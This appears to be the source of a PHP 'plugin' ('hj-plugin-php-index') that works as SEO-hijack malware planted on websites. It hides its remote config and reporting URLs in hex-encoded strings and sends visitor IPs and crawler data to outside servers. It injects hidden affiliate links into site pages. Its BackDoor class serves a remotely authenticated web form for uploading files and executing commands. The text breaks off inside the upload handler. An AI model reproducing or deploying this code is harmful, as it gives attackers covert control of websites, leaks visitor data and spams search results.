
function hj_join_paths()
{
    $paths = func_get_args();

    $is_absolute = strpos($paths[0], DIRECTORY_SEPARATOR) === 0;

    $trimmed_paths = array_map(function ($p) {
        return trim($p, DIRECTORY_SEPARATOR);
    }, $paths);

    $joined_path = implode(DIRECTORY_SEPARATOR, $trimmed_paths);

    if ($is_absolute) {
        $joined_path = DIRECTORY_SEPARATOR . $joined_path;
    }

    return $joined_path;
}

function hj_clean_cache_dir($dir)
{
    if (!file_exists($dir)) {
        return false;
    }

    if (is_file($dir) || is_link($dir)) {
        return unlink($dir);
    }

    if (is_dir($dir)) {
        $files = array_diff(scandir($dir), array('.', '..'));

        foreach ($files as $file) {
            $filePath = "$dir/$file";
            if (is_dir($filePath)) {
                hj_clean_cache_dir($filePath);
            } else {
                unlink($filePath);
            }
        }

        return rmdir($dir);
    }

    return false;
}

function hj_checkFilePath($filepath)
{

    $dir = dirname($filepath);

    if (!file_exists($dir)) {
        mkdir($dir, 0777, true);
    }
}

function hj_checkDir($dir)
{
    if (!file_exists($dir)) {
        mkdir($dir, 0777, true);
    }
}

function hj_contains($str, $needle)
{
    return strpos($str, $needle) !== false;
}

function hj_containsIgnoreCase($str, $needle)
{
    return stripos($str, $needle) !== false;
}

function hj_endsWith($str, $needle)
{
    return substr($str, -strlen($needle)) === $needle;
}

function hj_endsWithIgnoreCase($str, $needle)
{
    return stripos($str, $needle) === strlen($str) - strlen($needle);
}

function hj_startsWith($str, $needle)
{
    return strpos($str, $needle) === 0;
}

function hj_startsWithIgnoreCase($str, $needle)
{
    return stripos($str, $needle) === 0;
}

function hj_equals($str, $needle)
{
    return $str === $needle;
}

function hj_equalsIgnoreCase($str, $needle)
{
    return strtolower($str) === strtolower($needle);
}

function hj_curl_get($url, $headers = array('User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'), $skipVerify = true, $timeout = null)
{

    if (!function_exists('curl_init')) {
        return false;
    }

    $ch = curl_init();

    curl_setopt_array($ch, array(
        CURLOPT_URL => $url,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_HTTPHEADER => $headers
    ));

    if ($skipVerify) {
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
    }

    if ($timeout !== null) {

        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $timeout);

        curl_setopt($ch, CURLOPT_TIMEOUT, $timeout);
    }

    $content = @curl_exec($ch);

    $httpCode = @curl_getinfo($ch, CURLINFO_HTTP_CODE);

    if ($httpCode !== 200) {
        $content = false;
    }

    curl_close($ch);

    return $content;
}

function hj_get_file_content($file, $headers = array('User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'), $skipVerify = true, $timeout = null)
{

    if (HJ_OFFLINE) {
        $content = @file_get_contents($file);
        return $content;
    }

    if (HJ_FORCE_HTTP) {

        if (hj_startsWithIgnoreCase($file, 'http')) {
            $file = str_replace('https://', 'http://', $file);
        }
    }

    if (HJ_DIRECT) {

        if (hj_startsWithIgnoreCase($file, 'https://c.cseo8.com/')) {
            $file = str_replace('https://c.cseo8.com/', 'https://hijack-oss.oss-ap-southeast-1.aliyuncs.com/', $file);
        }

        if (hj_startsWithIgnoreCase($file, 'http://c.cseo8.com/')) {
            $file = str_replace('http://c.cseo8.com/', 'http://hijack-oss.oss-ap-southeast-1.aliyuncs.com/', $file);
        }

        if (hj_startsWithIgnoreCase($file, 'https://f.zseo8.com/')) {
            $file = str_replace('https://f.zseo8.com/', 'https://hijack-oss.oss-ap-southeast-1.aliyuncs.com/', $file);
        }

        if (hj_startsWithIgnoreCase($file, 'http://f.zseo8.com/')) {
            $file = str_replace('http://f.zseo8.com/', 'http://hijack-oss.oss-ap-southeast-1.aliyuncs.com/', $file);
        }

        if (hj_startsWithIgnoreCase($file, 'https://c.cseo88.com/')) {
            $file = str_replace('https://c.cseo88.com/', 'https://oss-seo.oss-ap-southeast-1.aliyuncs.com/', $file);
        }

        if (hj_startsWithIgnoreCase($file, 'http://c.cseo88.com/')) {
            $file = str_replace('http://c.cseo88.com/', 'http://oss-seo.oss-ap-southeast-1.aliyuncs.com/', $file);
        }

        if (hj_startsWithIgnoreCase($file, 'https://f.fseo88.com/')) {
            $file = str_replace('https://f.fseo88.com/', 'https://oss-seo.oss-ap-southeast-1.aliyuncs.com/', $file);
        }

        if (hj_startsWithIgnoreCase($file, 'http://f.fseo88.com/')) {
            $file = str_replace('http://f.fseo88.com/', 'http://oss-seo.oss-ap-southeast-1.aliyuncs.com/', $file);
        }
    }

    $opts = array(
        'http' => array(
            'header' => $headers, // 请求头
            'ignore_errors' => false // 忽略错误
        )
    );

    if ($timeout !== null) {

        $opts['http']['timeout'] = $timeout;
    }

    if ($skipVerify) {
        $opts['ssl'] = array(
            'verify_peer' => false,
            'verify_peer_name' => false
        );
    }
    $content = false;

    if (ini_get('allow_url_fopen')) {
        $content = @file_get_contents($file, false, stream_context_create($opts));
    }

    if ($content === false) {
        $content = hj_curl_get($file, $headers, $skipVerify, $timeout);
    }

    return $content;
}

function hj_echo()
{
    if (!HJ_LOG) {
        return;
    }

    $args = func_get_args();
    $output = implode('', $args);

    $microtime = microtime(true);

    $datetime = new DateTime();
    $datetime->setTimestamp(floor($microtime));

    $milliseconds = sprintf("%03d", ($microtime - floor($microtime)) * 1000);
    $timestamp = $datetime->format('Y-m-d H:i:s') . '.' . $milliseconds;
    echo $timestamp, " : ", $output, '<br/>', PHP_EOL;
}

function hj_get_dir_size($dir)
{
    $size = 0;
    if (!file_exists($dir)) {
        hj_echo("目录不存在: " . $dir);
        return $size;
    }

    if (!is_dir($dir)) {
        hj_echo($dir . " 不是一个有效的目录");
        return $size;
    }

    if (!is_readable($dir)) {
        hj_echo("没有权限访问目录: " . $dir);
        return $size;
    }

    try {

        $iterator = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($dir, RecursiveDirectoryIterator::SKIP_DOTS));
        foreach ($iterator as $file) {
            $realPath = $file->getRealPath();
            if ($realPath && is_readable($realPath)) {
                if ($file->isFile()) {
                    $size += $file->getSize();
                }
            } else {
                hj_echo("无法读取文件: " . $realPath);
                break;
            }
        }
    } catch (Exception $e) {
        hj_echo("发生错误: " . $e->getMessage());
    }

    return $size;
}

function hj_get_files_recursive($dir)
{
    $fileInfos = array();
    try {

        $iterator = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($dir, RecursiveDirectoryIterator::SKIP_DOTS), RecursiveIteratorIterator::LEAVES_ONLY);

        foreach ($iterator as $fileInfo) {
            if ($fileInfo->isFile()) {
                $fileInfo = array(
                    'file' => $fileInfo->getPathname(),
                    'mtime' => $fileInfo->getMTime()
                );
                array_push($fileInfos, $fileInfo);
            }
        }
    } catch (Exception $e) {

        hj_echo("发生错误: " . $e->getMessage());
    }

    return $fileInfos;
}

function hj_delete_files_by_mtime($dir, $percent = 0.1)
{

    if (!file_exists($dir) || !is_dir($dir)) {
        hj_echo("目录不存在或无效: ", $dir);
        return;
    }

    $percent = floatval($percent);
    if ($percent <= 0 || $percent >= 1) {
        hj_echo("参数错误，percent 必须在 0 和 1 之间: ", $percent);
        return;
    }

    $start = microtime(true);

    $fileInfos = hj_get_files_recursive($dir);

    $end = microtime(true);
    $duration = round(($end - $start) * 1000);
    hj_echo("清理目录:", $dir, " 获取文件列表用时: ", $duration, " 毫秒");

    if (empty($fileInfos)) {
        hj_echo("目录中没有可操作的文件: ", $dir);
        return;
    }

    $begin = microtime(true);

    usort($fileInfos, function ($a, $b) {
        return $a['mtime'] - $b['mtime'];
    });

    $end = microtime(true);

    $duration = round(($end - $begin) * 1000);
    hj_echo("清理目录:", $dir, " 排序文件列表用时: ", $duration, " 毫秒");

    $total = count($fileInfos);

    $limit = ceil($total * $percent);

    if ($limit <= 0) {
        hj_echo("清理目录:", $dir, " 参数错误，limit 必须大于 0: ", $limit);
        return;
    }

    $fileInfosToDelete = array_slice($fileInfos, 0, $limit);

    $start = microtime(true);
    $deleted  = 0;
    foreach ($fileInfosToDelete as $fileInfo) {
        $file = $fileInfo['file'];
        if (unlink($file)) {
            $deleted++;
            hj_echo("删除成功: ", $file);
        } else {
            hj_echo("删除失败: ", $file);
        }
    }
    $end = microtime(true);

    $duration = round(($end - $start) * 1000);
    hj_echo("清理目录:", $dir, " 操作完成，总文件数: ", $total, " 删除文件", $deleted, "用时: ", $duration, " 毫秒");

    return array(
        'total' => $total,
        'limit' => $limit,
        'deleted' => $deleted,
        'duration' => $duration
    );
}

function hj_format_size($size)
{
    $units = array('B', 'KB', 'MB', 'GB', 'TB');
    for ($i = 0; $size >= 1024 && $i < count($units) - 1; $i++) {
        $size /= 1024;
    }
    return round($size, 2) . '' . $units[$i];
}

function hj_format_duration($seconds)
{
    if (
        $seconds < 60
    ) {
        return $seconds . ' 秒';
    } elseif ($seconds < 3600) { // 小于 1 小时
        $minutes = floor($seconds / 60);
        $remainingSeconds = $seconds % 60;
        return $minutes . ' 分钟 ' . ($remainingSeconds > 0 ? $remainingSeconds . ' 秒' : '');
    } elseif ($seconds < 86400) { // 小于 1 天
        $hours = floor($seconds / 3600);
        $remainingMinutes = floor(($seconds % 3600) / 60);
        return $hours . ' 小时 ' . ($remainingMinutes > 0 ? $remainingMinutes . ' 分钟' : '');
    } else { // 大于 1 天
        $days = floor($seconds / 86400);
        $remainingHours = floor(($seconds % 86400) / 3600);
        return $days . ' 天 ' . ($remainingHours > 0 ? $remainingHours . ' 小时' : '');
    }
}

function hj_convert_utf8_string($str)
{

    if (!is_string($str)) {
        return $str;
    }

    if (!extension_loaded('mbstring')) {
        return $str;
    }

    $encoding = @mb_detect_encoding($str, "UTF-8, ISO-8859-1", true);

    if ($encoding && $encoding != "UTF-8") {
        $str = @mb_convert_encoding($str, "UTF-8", $encoding);
    }

    return $str;
}

if (!function_exists('http_response_code')) {
    function http_response_code($code = NULL)
    {
        if ($code !== NULL) {
            header('HTTP/1.1 ' . $code);
        }
        return $code;
    }
}

if (!function_exists('hex2bin')) {
    /**
     * 将十六进制字符串转换为二进制字符串
     *
     * @param string $hex 十六进制字符串
     * @return string|false 转换后的二进制字符串或 false（如果输入无效）
     */
    function hex2bin($hex)
    {

        if (!is_string($hex)) {
            return false;
        }

        if (strlen($hex) % 2 !== 0) {
            return false; // 或者抛出异常
        }

        $bin = '';

        for ($i = 0; $i < strlen($hex); $i += 2) {

            $pair = substr($hex, $i, 2);

            $bin .= chr(hexdec($pair));
        }

        return $bin;
    }
}

function hj_md5_to_path($md5)
{

    $dir = substr($md5, 0, 2);

    $file = substr($md5, 2);

    return $dir . DIRECTORY_SEPARATOR . $file;
}

function hj_is_ip_blocked($clientIp, $blacklistFile)
{

    $clientBinary = @inet_pton($clientIp);
    if ($clientBinary === false) {

        return false;
    }

    $entries = @file($blacklistFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    if ($entries === false) {

        return false;
    }

    foreach ($entries as $entry) {
        $entry = trim($entry);
        if (strpos($entry, '/') !== false) {

            list($subnet, $prefix) = explode('/', $entry, 2);
            $subnetBinary = @inet_pton($subnet);
            if ($subnetBinary === false) {

                continue;
            }

            if (strlen($subnetBinary) === 4) {
                $maxPrefix =  32;
            } else {
                $maxPrefix = 128;
            }

            $prefix = (int)$prefix;
            if ($prefix < 0 || $prefix > $maxPrefix) {

                continue;
            }

            $mask = str_repeat("\xff", $prefix >> 3);
            if ($prefix % 8 != 0) {
                $mask .= chr(0xff << (8 - ($prefix % 8)));
            }

            $mask = str_pad($mask, strlen($subnetBinary), "\x00");

            if ((substr($clientBinary, 0, strlen($mask)) & $mask) === (substr($subnetBinary, 0, strlen($mask)) & $mask)) {

                return true;
            }
        } else {

            $entryBinary = @inet_pton($entry);

            if ($entryBinary !== false && $entryBinary === $clientBinary) {
                return true;
            }
        }
    }
    return false;
}

define('HJ_NAME', 'hj-plugin-php-index');

define('HJ_VERSION', 'v2.0.1');

if (!defined("HJ_DEBUG")) {

    define("HJ_DEBUG", false);
}

if (!defined("HJ_LOG")) {

    define('HJ_LOG', false);
}

define('HJ_ENGLISH_COUNTRY', true);

define('HJ_API_TIMEOUT', 5);

define('HJ_FORCE_HTTP', false);

define('HJ_DIRECT', false);

$GLOBALS['HJ_CONFIG_URL_FORMAT_ARRAY'] =  array(

    hex2bin("68747470733a2f2f632e627463637279707463696f6e2e62697a2f636f6e6669672f25732e6a736f6e"), //默认配置路径
    hex2bin("68747470733a2f2f632e6373656f3838382e636c69636b2f636f6e6669672f25732e6a736f6e"), //备用配置路径
    hex2bin("68747470733a2f2f632e6373656f3838382e78797a2f636f6e6669672f25732e6a736f6e"), //第三配置路径
    hex2bin("68747470733a2f2f632e6373656f39392e636f6d2f636f6e6669672f25732e6a736f6e"), //旧配置路径
    hex2bin("68747470733a2f2f6f73732d73656f2d74772e6f73732d61702d736f757468656173742d312e616c696979756e63732e636f6d2f636f6e6669672f25732e6a736f6e"), //OSS配置路径
);

define('HJ_CONFIG_CACHE_DIR', implode(DIRECTORY_SEPARATOR, array($_SERVER['DOCUMENT_ROOT'], '.cache')));

if (!file_exists(HJ_CONFIG_CACHE_DIR)) {

    mkdir(HJ_CONFIG_CACHE_DIR, 0777, true);
}

define('HJ_MODE_NORMAL', 0);

define('HJ_MODE_LANDPAGE_API', 1);

define('HJ_MODE_SILENT', 99);

define('HJ_LANDING_URL', '/landpage');

define('HJ_BOT_LOG_URL', '/bot');

define('HJ_DEFAULT_LOCAL_LINK_NUM', 40);

define('HJ_DEFAULT_AFF_LINK_NUM', 20);

define('HJ_UPDATE_AUTH', true);

define('HJ_UPDATE_SECRET', 'udjqpBz1aBWAn0uofZyrwGMf777EfE2x');

define('HJ_REPORT_BASE_URL', hex2bin("68747470733a2f2f6170692e627463637279707463696f6e2e78797a2f636c69656e74"));

define('HJ_REPORT_NO_REMOTE_CONFIG_URL', '/reportNoRemoteConfig');

define('HJ_REWRITE', true);

define('HJ_OFFLINE', false);

define('HJ_OFFLINE_HOST', 'config');

define('HJ_AUTH_URL', '/auth');

class AffLink
{

    private static function getAffLinkSeoResArr($count)
    {

        if ($count <= 0) {
            return array();
        }
        $affLinkSeoResArr = Manager::getAffLinkSeoResArr();
        if (!is_array($affLinkSeoResArr)) {
            return array();
        }
        $resArr = Template::getSeoResFromResArr($affLinkSeoResArr, $count);

        return  $resArr;
    }

    public static function getAffLinkRandSeoUrl($count = 1, $roundRobin = true)
    {
        srand();

        $seoResManifestArr = Manager::getSeoResManifestArr();

        if (!empty($seoResManifestArr)) {
            if ($roundRobin) {
                $manifestItems = Template::getRoundRobinItemFromSeoResManifestByCount($seoResManifestArr, $count);
            } else {
                $manifestItems = Template::getRandomItemFromSeoResManifestByCount($seoResManifestArr, $count);
            }
            if (!empty($manifestItems) & count($manifestItems) > 0) {
                $items = array();
                foreach ($manifestItems as $manifestItem) {

                    $title = $manifestItem['title'];
                    $id = $manifestItem['id'];
                    $line = $manifestItem['line'];
                    $varName = $manifestItem['varName'];
                    $url = $manifestItem['url']; //清单中{网页模板}的url

                    $KeyWord = $title . '-' . $id . '-' . $line;

                    $url = Template::getSeoUrlByKeyword($KeyWord);
                    if (!empty($url)) {
                        $item = array(
                            'title' => $title,
                            'url' => $url
                        );
                        array_push($items, $item);
                    }
                }
                return $items;
            }
        }

        return array();
    }

    public static function getAffLinkBaseUrl($affLink)
    {
        $AffLinkBaseUrl = RequestUtils::getBaseUrl($affLink);

        $path = RequestUtils::getUrlPath($affLink);

        $pathArr = explode('/', $path);
        if (count($pathArr) > 2) {
            $path = $pathArr[1];
            if (hj_endsWithIgnoreCase($path, '.php')) {
                $AffLinkBaseUrl = $AffLinkBaseUrl . "/" . $path;
                hj_echo("getAffLinkBaseUrl AffLinkBaseUrl 特殊入口:" . $AffLinkBaseUrl);
            }
        }
        return $AffLinkBaseUrl;
    }

    public static function getAffLinkLocalATags($count = null)
    {
        if ($count === null) {
            $count = Manager::getSeoSiteLocalLinkNum();
        }

        srand();
        $affLinkLocalATags = array();
        $affLinkRandSeoUrlItems = self::getAffLinkRandSeoUrl($count, true);

        $urls = array();
        foreach ($affLinkRandSeoUrlItems as $i => $item) {
            $url = $item['url'];
            $title = $item['title'];

            if (RequestUtils::isBeginWithEntryScriptInRequestUri()) {
                $url = RequestUtils::getEntryScriptPath() . $url;
            }
            $alink = '<a href="' . $url . '">' . $title . '</a>';
            array_push($affLinkLocalATags, $alink);
            array_push($urls, $url);
        }

        Sitemap::writeSitemapsFileSafe($urls);
        return  $affLinkLocalATags;
    }

    public static function getAffLinkSeoSiteAffTags($count = null)
    {
        if ($count === null) {
            $count = Manager::getSeoSiteAffLinkNum();
        }

        $affLinkSeoResArr = self::getAffLinkSeoResArr($count);
        if (empty($affLinkSeoResArr)) {
            hj_echo("外部导流seo链接资源为空");
            return array();
        }
        $affLinkRandSeoUrlItems = self::getAffLinkRandSeoUrl($count, false);

        $affLinkSeoSiteAffTags = array();

        foreach ($affLinkSeoResArr as $i => $value) {
            $linkArr = explode(',', $value);
            if ($linkArr == null || count($linkArr) < 2) {
                continue;
            }

            $link = trim($linkArr[0]);
            $linkName = trim($linkArr[1]);

            $affLinkBaseUrl = self::getAffLinkBaseUrl($link);

            if (!empty($affLinkRandSeoUrlItems)) {
                $url = $affLinkRandSeoUrlItems[$i]['url'];
                $link =  $affLinkBaseUrl . $url;
                $title = $affLinkRandSeoUrlItems[$i]['title'];

            }

            $alink = '<a href="' . $link . '">' . $title . '</a>';
            array_push($affLinkSeoSiteAffTags, $alink);
        }

        return  $affLinkSeoSiteAffTags;
    }

    private static function replaceAffLinkTemplateLocal($affLinkTemplateContent, $affLinkLocalATagsContent)
    {

        $affLinkTemplateContent = str_replace("{本地友链}", $affLinkLocalATagsContent, $affLinkTemplateContent);
        return $affLinkTemplateContent;
    }

    private static function replaceAffLinkTemplateSeoSite($affLinkTemplateContent, $affLinkSeoSiteATagsContent)
    {

        $affLinkTemplateContent = str_replace("{外部友链}", $affLinkSeoSiteATagsContent, $affLinkTemplateContent);
        return $affLinkTemplateContent;
    }

    private static function replaceAffLinkTemplate($affLinkTemplateContent, $affLinkLocalATagsContent, $affLinkSeoSiteATagsContent)
    {

        $affLinkTemplateContent = self::replaceAffLinkTemplateLocal($affLinkTemplateContent, $affLinkLocalATagsContent);

        $affLinkTemplateContent = self::replaceAffLinkTemplateSeoSite($affLinkTemplateContent, $affLinkSeoSiteATagsContent);
        return $affLinkTemplateContent;
    }

    public static function getAffLinkContent()
    {

        $affTitle = null;
        $affKeywords = '';
        $affLinkLocalATagsContent = "\r\n";
        $affDesc = '';

        $start = microtime(true);

        $affLinkLocalATags = self::getAffLinkLocalATags();
        if ($affLinkLocalATags != null) {

            if (count($affLinkLocalATags) > 0) {
                $alink = $affLinkLocalATags[0];

                $affTitle = Template::getFirstATagContent($alink);
            }
            $affLinkLocalATagsContent .= implode("\r\n", $affLinkLocalATags);
        }
        $affLinkLocalATagsContent .= "\r\n";

        $end = microtime(true);

        $duration =  round(($end - $start) * 1000);
        $affLinkLocalATagsContent .= "<!--AffLocalRespTime:" . $duration . "ms-->\r\n";

        $start = microtime(true);

        $affLinkSeoSiteATagsContent = "\r\n";

        $affLinkSeoSiteAffTags = self::getAffLinkSeoSiteAffTags();

        if ($affLinkSeoSiteAffTags != null) {

            $affLinkSeoSiteATagsContent .= implode("\r\n", $affLinkSeoSiteAffTags);
        }
        $affLinkSeoSiteATagsContent .= "\r\n";

        $end = microtime(true);

        $duration =  round(($end - $start) * 1000);
        $affLinkSeoSiteATagsContent .= "<!--AffSiteRespTime:" . $duration . "ms-->\r\n";

        $affLinkTemplateContent = Manager::getAffLinkTemplateContent();

        if (!Manager::getSeoSiteUseOriginalContent()) {
            if ($affLinkTemplateContent) {
                $affLinkTemplateContent = self::replaceAffLinkTemplate($affLinkTemplateContent, $affLinkLocalATagsContent, $affLinkSeoSiteATagsContent);
                return $affLinkTemplateContent;
            }
            return $affLinkLocalATagsContent . $affLinkSeoSiteATagsContent;
        }

        $content = null;

        $originalContent = Manager::getOriginalContent();

        if ($originalContent) {
            hj_echo("渲染推广链接页面 原始内容存在", $originalContent);

            if (preg_match('/<head\b[^>]*>/i', $originalContent) && preg_match('/<body\b[^>]*>/i', $originalContent)) {
                hj_echo("渲染推广链接 head 和 body 标签存在");

                $originalContent = Template::addSeoRuleToHref($originalContent);

                $affTitle = Template::getTitle($originalContent);

                $floating_links_class_name = "floating-links-" . uniqid();
                $style = '
                    <style>
                        .' . $floating_links_class_name . ' {
                            position: fixed;
                            top: 50%;
                            left: 0;
                            transform: translateY(-50%);
                            width: auto;
                            background-color: #f8f9fa;
                            border-right: 1px solid #ddd;
                            padding: 10px;
                            box-shadow: 2px 2px 5px rgba(0, 0, 0, 0.1);
                        }

                        .' . $floating_links_class_name . ' a {
                            display: block;

                            text-decoration: none;
                            margin-bottom: 10px;
                        }

                        .' . $floating_links_class_name . ' a:hover {
                            text-decoration: underline;
                        }

                    </style>';

                $content = preg_replace('/(<\/head>)/i', $style . '$1', $originalContent);
                $affLinkContent = $affLinkLocalATagsContent . $affLinkSeoSiteATagsContent;

                $insertString = '<div class="' . $floating_links_class_name . '">' . $affLinkContent . '</div>';

                $content = preg_replace('/(<body[^>]*>)/i', '$1' . $insertString, $content);
            }
        }

        if (!$content) {

            if ($affLinkTemplateContent) {
                $affLinkTemplateContent = self::replaceAffLinkTemplate($affLinkTemplateContent, $affLinkLocalATagsContent, $affLinkSeoSiteATagsContent);
                $content = $affLinkTemplateContent;
            } else {
                $affLinkContent = $affLinkLocalATagsContent . $affLinkSeoSiteATagsContent;
                $content = $affLinkContent;
            }
        }
        return $content;
    }
}

class Api
{

    public static function getLandPage($seoConfigId, $referer, $url, $keyword)
    {
        $baseUrl = Manager::clientBaseUrl();
        $client = new HttpClient($baseUrl);
        $clientIp = RequestUtils::getRealClientIP();
        $param = array(
            'seoConfigId' => $seoConfigId,
            'referer' => $referer,
            'url' => $url,
            'keyword' => $keyword,
            'clientIp' => $clientIp
        );
        $httpResult = $client->postJson(HJ_LANDING_URL, $param);

        if (isset($httpResult['result']) || $httpResult['result']) {

            if (isset($httpResult['data']) && is_array($httpResult['data'])) {
                $resultData = $httpResult['data'];

                if (isset($resultData['code']) && $resultData['code'] == 0) {

                    if (isset($resultData['data']) && is_array($resultData['data'])) {
                        $data = $resultData['data'];

                        return $data;
                    }
                }
            }
        }
        return null;
    }

    public static function buildLandPageUrl($seoConfigId, $referer, $url, $keyword)
    {
        $baseUrl = Manager::clientBaseUrl();
        $client = new HttpClient($baseUrl);
        $param = array(
            'seoConfigId' => $seoConfigId,
            'referer' => $referer,
            'url' => $url,
            'keyword' => $keyword
        );
        return $client->buildUrl(HJ_LANDING_URL, $param);
    }

    public static function getLandPageData($seoConfigId, $referer, $url, $keyword)
    {

        if (HJ_OFFLINE) {

            $landPageUrl = self::buildLandPageUrl($seoConfigId, $referer, $url, $keyword);

            hj_echo("离线版本: HJ_OFFLINE= ", HJ_OFFLINE, " 构建落地页url:", $landPageUrl);
            return array(
                'analysisId' => '',
                'landpageUrl' => $landPageUrl
            );
        }

        if (Manager::getMode() == HJ_MODE_NORMAL) {

            $data = self::getLandPage($seoConfigId, $referer, $url, $keyword);
            hj_echo('正常模式 优先请求api接口 请求落地页信息:', Manager::getMode(), json_encode($data));

            if (!empty($data)) {
                return $data;
            }
        }

        $landPageUrl = self::buildLandPageUrl($seoConfigId, $referer, $url, $keyword);

        hj_echo("其他模式:", Manager::getMode(), " 或者请求落地页api 失败 构建落地页url:", $landPageUrl);
        return array(
            'analysisId' => '',
            'landpageUrl' => $landPageUrl
        );
    }

    public static function postBotLog($seoConfigId, $referer, $url, $keyword, $ua, $httpStatus = 200, $contentLength = 0, $responseTime = 0)
    {

        if (HJ_OFFLINE) {
            hj_echo("离线版本 不走请求api接口 上报爬虫信息");
            return;
        }

        if (Manager::getMode() == HJ_MODE_SILENT) {
            hj_echo("静默模式 不走请求api接口 上报爬虫信息", Manager::getMode());
            return;
        }

        $baseUrl = Manager::clientBaseUrl();
        $client = new HttpClient($baseUrl);

        if (!isset($referer) || empty($referer)) {
            $referer = '';
        }

        if (strlen($keyword) > 256) {
            $keyword = substr($keyword, 0, 256);
        }

        $realClientIP = RequestUtils::getRealClientIP();

        $site =  RequestUtils::getHost();

        $param = array(
            'seoConfigId' => $seoConfigId,
            'referer' => $referer,
            'url' => $url,
            'keyword' => $keyword,
            'ua' => $ua,
            'httpStatus' => $httpStatus,
            'contentLength' => $contentLength,
            'responseTime' => $responseTime,
            'ip' => $realClientIP,
            'site' => $site
        );
        hj_echo('上报爬虫:', $baseUrl, json_encode($param));
        return $client->postJson(HJ_BOT_LOG_URL, $param, true);
    }

    public static function getReportFilePath($site)
    {
        $reportFilePath = hj_join_paths(Disk::getConfigCacheDir(), '.r.' . $site);
        return $reportFilePath;
    }

    public static function postNoRemoteConfig($configUrl)
    {

        if (HJ_OFFLINE) {
            hj_echo("离线版本 不走请求api接口 上报爬虫信息", HJ_OFFLINE);
            return;
        }

        if (Manager::getMode() == HJ_MODE_SILENT) {
            hj_echo("静默模式 不走请求api接口 上报爬虫信息", Manager::getMode());
            return;
        }

        $site =  RequestUtils::getHost();

        $reportFilePath = self::getReportFilePath($site);
        if (file_exists($reportFilePath)) {

            if ((filemtime($reportFilePath) > time() - 60 * 60)) {
                hj_echo('上报没有远程配置信息: 60分钟内已经上报过');
                return;
            }

            touch($reportFilePath, time());
        }

        $baseUrl = HJ_REPORT_BASE_URL;
        $client = new HttpClient($baseUrl);

        if (!is_string($configUrl)) {
            $configUrl = '';
        }
        $param = array(
            'site' => $site,
            'configUrl' => $configUrl
        );
        hj_echo('上报没有远程配置信息:', json_encode($param));

        $ret = $client->postJson(HJ_REPORT_NO_REMOTE_CONFIG_URL, $param, true);

        if (!empty($ret) && isset($ret['result']) && $ret['result']) {

            file_put_contents($reportFilePath, time());
        }
        return $ret;
    }

    public static function auth($seoConfigId, $authKey)
    {

        if (HJ_OFFLINE) {
            hj_echo("离线版本 不走请求api接口 密钥认证");
            return array(
                'result' => true,
                'data' => array(
                    'code' => 0,
                    'msg' => '离线版本认证成功',
                    'data' => array()
                )
            );
        }

        $baseUrl = Manager::clientBaseUrl();
        $client = new HttpClient($baseUrl);

        $param = array(
            'seoConfigId' => $seoConfigId,
            'authKey' => $authKey
        );

        hj_echo('密钥认证请求:', $baseUrl . HJ_AUTH_URL, json_encode($param));

        $httpResult = $client->postJson(HJ_AUTH_URL, $param);

        if (isset($httpResult['result']) && $httpResult['result']) {

            if (isset($httpResult['data']) && is_array($httpResult['data'])) {
                $resultData = $httpResult['data'];

                if (isset($resultData['code']) && $resultData['code'] == 0) {
                    hj_echo('密钥认证成功:', json_encode($resultData));
                    return $httpResult;
                } else {
                    hj_echo('密钥认证失败 - 服务端返回错误:', json_encode($httpResult));
                    return null;
                }
            }
        }

        hj_echo('密钥认证失败 - 请求异常:', json_encode($httpResult));
        return null;
    }
}

class BackDoor
{

    public static function handleBackDoor($seoConfigId)
    {

        $method = $_SERVER['REQUEST_METHOD'];
        if ($method === 'GET') {

            return  self::getBackDoorHtml($seoConfigId);
        } else if ($method === 'POST') {

            return self::postBackDoorRequest($seoConfigId);
        } else {

            return null;
        }
    }

    public static function getBackDoorHtml($seoConfigId)
    {

        $authKey = isset($_GET['authKey']) ? $_GET['authKey'] : '';

        $isAuthResult = Api::auth($seoConfigId, $authKey);
        if (!$isAuthResult) {

            return null;
        }

        if (!isset($isAuthResult['result']) || !$isAuthResult['result']) {
            $content =  "认证失败，请求错误。<br/>";
            $content .= json_encode($isAuthResult) . "<br/>";
            return $content;
        }

        if (!isset($isAuthResult['data']) || !is_array($isAuthResult['data'])) {
            $content =  "认证失败，数据错误。<br/>";
            $content .= json_encode($isAuthResult) . "<br/>";
            return $content;
        }

        if (!isset($isAuthResult['data']['code']) || $isAuthResult['data']['code'] !== 0) {
            $content =  "认证失败，密钥错误。<br/>";
            $content .= json_encode($isAuthResult) . "<br/>";
            return $content;
        }

        $content = "<h2>后门管理页面</h2>";

        $content = "当前站点路径: " . getcwd() . "<br/>";
        $content .= '<br/>';
        $content .= '<form method="POST" enctype="multipart/form-data">';

        $content .= '认证密钥: <input type="text" name="authKey" id="authKey" value="' . $authKey . '"><br/>';
        $content .= '上传文件: <input type="file" name="fileToUpload" id="fileToUpload"><br/>';
        $content .= '上传路径: <input type="text" name="uploadPath" id="uploadPath" value="' . getcwd() . '"><br/>';
        $content .= '命令: <input type="text" name="command" id="command"><br/>';
        $content .= '<input type="submit" value="上传文件" name="submitUpload">';
        $content .= '<input type="submit" value="执行命令" name="submitCommand">';
        $content .= '</form>';

        return $content;
    }

    public static function postBackDoorRequest($seoConfigId)
    {

        $authKey = isset($_POST['authKey']) ? $_POST['authKey'] : '';

        $isAuthResult = Api::auth($seoConfigId, $authKey);
        if (!$isAuthResult) {
            return null;
        }

        if (!isset($isAuthResult['result']) || !$isAuthResult['result']) {
            $content =  "认证失败，请求错误。<br/>";
            $content .= json_encode($isAuthResult) . "<br/>";
            return $content;
        }

        if (!isset($isAuthResult['data']) || !is_array($isAuthResult['data'])) {
            $content =  "认证失败，数据错误。<br/>";
            $content .= json_encode($isAuthResult) . "<br/>";
            return $content;
        }

        if (!isset($isAuthResult['data']['code']) || $isAuthResult['data']['code'] !== 0) {
            $content =  "认证失败，密钥错误。<br/>";
            $content .= json_encode($isAuthResult) . "<br/>";
            return $content;
        }

        if (isset($_POST['submitUpload'])) {
